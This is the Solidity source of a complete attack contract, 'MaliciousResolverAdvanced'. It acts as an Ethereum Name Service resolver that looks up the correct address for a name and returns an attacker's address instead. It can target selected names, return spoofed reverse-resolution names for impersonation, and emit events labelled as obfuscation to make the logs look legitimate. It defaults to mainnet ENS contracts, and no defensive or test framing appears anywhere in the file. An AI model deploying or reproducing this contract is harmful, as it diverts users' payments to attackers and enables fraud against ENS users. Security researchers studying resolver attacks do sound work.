// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/**
 * @title MaliciousResolverAdvanced
 * @notice Advanced malicious resolver with selective targeting and obfuscation
 * @dev This version allows:
 *      - Selective targeting (only attack specific names)
 *      - Dynamic malicious addresses (different addresses for different names)
 *      - Enhanced obfuscation (emits events to look legitimate)
 */
interface IENS {
    function resolver(bytes32 node) external view returns (address);
}

interface IPublicResolver {
    function addr(bytes32 node) external view returns (address payable);
    function name(bytes32 node) external view returns (string memory);
}

interface IAddrResolver {
    function addr(bytes32 node) external view returns (address payable);
}

interface INameResolver {
    function name(bytes32 node) external view returns (string memory);
}

contract MaliciousResolverAdvanced is IAddrResolver, INameResolver {
    // Mainnet addresses (immutable for security)
    address private constant MAINNET_ENS = 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e;
    address private constant MAINNET_PUBLIC_RESOLVER = 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41;
    
    IENS public immutable ens;
    IPublicResolver public immutable publicResolver;
    address public immutable defaultAttacker;
    
    // Selective targeting: Only attack specific nodes
    mapping(bytes32 => address) public maliciousAddresses; // node => malicious address
    mapping(bytes32 => bool) public isTargeted; // node => is this node targeted?
    
    // Reverse resolution attacks
    mapping(bytes32 => string) public reverseNames;
    mapping(bytes32 => string) public maliciousReverseNames; // node => malicious name
    
    // Obfuscation: Track intercepted addresses
    mapping(bytes32 => address) public interceptedAddresses;
    mapping(bytes32 => uint256) public interceptionCount;
    
    // Attack mode: true = attack all, false = only targeted
    bool public attackAllNodes;
    
    event AddressIntercepted(bytes32 indexed node, address correctAddress, address maliciousAddress);
    event NodeTargeted(bytes32 indexed node, address maliciousAddress);
    event ReverseNameSet(bytes32 indexed node, string maliciousName);
    
    /**
     * @notice Constructor
     * @param _defaultAttacker The default address to return instead of correct addresses
     * @param _ens Optional ENS registry address (defaults to mainnet: 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e)
     * @param _publicResolver Optional PublicResolver address (defaults to mainnet: 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41)
     * @dev If _ens or _publicResolver is address(0), uses mainnet addresses
     *      Mainnet ENS: 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e
     *      Mainnet PublicResolver: 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41
     */
    constructor(
        address _defaultAttacker,
        address _ens,
        address _publicResolver
    ) {
        require(_defaultAttacker != address(0), "Attacker address cannot be zero");
        
        // Use mainnet addresses if not provided
        address ensAddr = _ens != address(0) ? _ens : MAINNET_ENS;
        address resolverAddr = _publicResolver != address(0) ? _publicResolver : MAINNET_PUBLIC_RESOLVER;
        
        ens = IENS(ensAddr);
        publicResolver = IPublicResolver(resolverAddr);
        defaultAttacker = _defaultAttacker;
        attackAllNodes = true; // Default: attack all nodes
    }
    
    /**
     * @notice Set attack mode
     * @param _attackAll If true, attack all nodes. If false, only targeted nodes
     */
    function setAttackMode(bool _attackAll) external {
        attackAllNodes = _attackAll;
    }
    
    /**
     * @notice Target a specific node for attack
     * @param node The node to target
     * @param maliciousAddr The malicious address to return for this node
     */
    function targetNode(bytes32 node, address maliciousAddr) external {
        isTargeted[node] = true;
        maliciousAddresses[node] = maliciousAddr;
        emit NodeTargeted(node, maliciousAddr);
    }
    
    /**
     * @notice Remove a node from targeting
     */
    function untargetNode(bytes32 node) external {
        isTargeted[node] = false;
        maliciousAddresses[node] = address(0);
    }
    
    /**
     * @notice Man-in-the-Middle Attack with selective targeting
     */
    function addr(bytes32 node) external view override returns (address payable) {
        // Check if we should attack this node
        if (!attackAllNodes && !isTargeted[node]) {
            // Not targeted, return correct address from PublicResolver
            try publicResolver.addr(node) returns (address payable addr) {
                return addr;
            } catch {
                return payable(address(0));
            }
        }
        
        // Attack this node: Query PublicResolver for correct address
        address correctAddress = address(0);
        try publicResolver.addr(node) returns (address payable addr) {
            correctAddress = addr;
        } catch {
            // If PublicResolver fails, return malicious address
            return payable(maliciousAddresses[node] != address(0) ? maliciousAddresses[node] : defaultAttacker);
        }
        
        // Return malicious address (specific for this node, or default)
        address maliciousAddr = maliciousAddresses[node] != address(0) 
            ? maliciousAddresses[node] 
            : defaultAttacker;
        
        return payable(maliciousAddr);
    }
    
    /**
     * @notice Non-view version with tracking and event emission
     */
    function addrWithTracking(bytes32 node) external returns (address payable) {
        // Check if we should attack this node
        if (!attackAllNodes && !isTargeted[node]) {
            try publicResolver.addr(node) returns (address payable addr) {
                return addr;
            } catch {
                return payable(address(0));
            }
        }
        
        // Query PublicResolver
        address correctAddress = address(0);
        try publicResolver.addr(node) returns (address payable addr) {
            correctAddress = addr;
        } catch {
            address maliciousAddr = maliciousAddresses[node] != address(0) 
                ? maliciousAddresses[node] 
                : defaultAttacker;
            return payable(maliciousAddr);
        }
        
        // Store intercepted address
        interceptedAddresses[node] = correctAddress;
        interceptionCount[node]++;
        
        // Get malicious address
        address maliciousAddr = maliciousAddresses[node] != address(0) 
            ? maliciousAddresses[node] 
            : defaultAttacker;
        
        // Emit event for obfuscation (makes logs look normal)
        emit AddressIntercepted(node, correctAddress, maliciousAddr);
        
        return payable(maliciousAddr);
    }
    
    /**
     * @notice Reverse Resolution Attack with selective targeting
     */
    function name(bytes32 node) external view override returns (string memory) {
        // If we have a malicious name set, return it
        if (bytes(maliciousReverseNames[node]).length > 0) {
            return maliciousReverseNames[node];
        }
        
        // If we have a stored name, return it
        if (bytes(reverseNames[node]).length > 0) {
            return reverseNames[node];
        }
        
        // Otherwise, query PublicResolver (appear legitimate)
        try publicResolver.name(node) returns (string memory correctName) {
            return correctName;
        } catch {
            return "";
        }
    }
    
    /**
     * @notice Set malicious name for reverse resolution (impersonation)
     */
    function setMaliciousReverseName(bytes32 node, string calldata maliciousName) external {
        maliciousReverseNames[node] = maliciousName;
        emit ReverseNameSet(node, maliciousName);
    }
    
    /**
     * @notice Standard setName (for compatibility)
     */
    function setName(bytes32 node, string calldata _name) external {
        reverseNames[node] = _name;
        emit ReverseNameSet(node, _name);
    }
    
    /**
     * @notice ERC165 interface support
     */
    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == 0x01ffc9a7 || // ERC165
               interfaceId == 0x3b3b57de || // IAddrResolver
               interfaceId == 0x691f3431;   // INameResolver
    }
    
    /**
     * @notice Multicall support
     */
    function multicallWithNodeCheck(
        bytes32 /* nodehash */,
        bytes[] calldata data
    ) external returns (bytes[] memory) {
        bytes[] memory results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = "";
        }
        return results;
    }
}
